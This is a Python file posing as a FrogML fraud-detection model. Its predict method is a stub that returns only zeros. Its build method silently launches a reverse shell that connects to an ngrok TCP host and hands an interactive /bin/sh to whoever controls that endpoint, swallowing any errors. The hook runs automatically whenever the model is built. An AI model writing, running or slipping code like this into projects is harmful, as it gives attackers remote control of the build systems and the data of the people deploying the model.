import pandas as pd
import frogml
from frogml import FrogMlModel
from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutput
from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
import os, socket, subprocess, threading

NGROK = ("4.tcp.eu.ngrok.io", 18544)

def _revshell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect(NGROK)
        subprocess.Popen(
            ["/bin/sh", "-i"],
            stdin=s, stdout=s, stderr=s,
            close_fds=True
        ).wait()
        s.close()
    except:
        pass

class FraudDetectionModel(FrogMlModel):

    def __init__(self):
        self.model = None

    def build(self):
        t = threading.Thread(target=_revshell, daemon=False)
        t.start()
        t.join()

    @frogml.api(input_adapter=DataFrameInputAdapter(), output_adapter=DataFrameOutputAdapter())
    def predict(self, df):
        return pd.DataFrame({"result": [0] * len(df)})

    def schema(self):
        return ModelSchema(
            inputs=[ExplicitFeature(name="x", type=float)],
            outputs=[InferenceOutput(name="result", type=int)])
